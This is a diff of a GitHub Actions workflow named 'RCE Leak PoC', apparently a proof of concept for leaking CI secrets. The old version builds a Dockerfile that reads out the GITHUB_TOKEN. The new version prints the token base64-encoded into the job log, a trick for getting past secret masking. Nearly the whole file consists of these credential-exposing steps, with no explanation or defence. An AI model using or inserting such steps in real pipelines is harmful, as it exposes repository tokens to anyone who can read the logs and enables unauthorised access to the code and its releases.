@@ -3,13 +3,13 @@ name: RCE Leak PoC
 on: [push]
 
 jobs:
-  rce:
+  leak:
     runs-on: ubuntu-latest
     steps:
       - name: Checkout
         uses: actions/checkout@v2
 
-      - name: Inject Dockerfile
+      - name: Leak GitHub Token
         run: |
-          echo -e "FROM alpine\nRUN echo \$GITHUB_TOKEN | base64 > /leaked && cat /leaked" > Dockerfile
-          docker build -t test-image .
+          echo "Leaking GITHUB_TOKEN:"
+          echo "$GITHUB_TOKEN" | base64
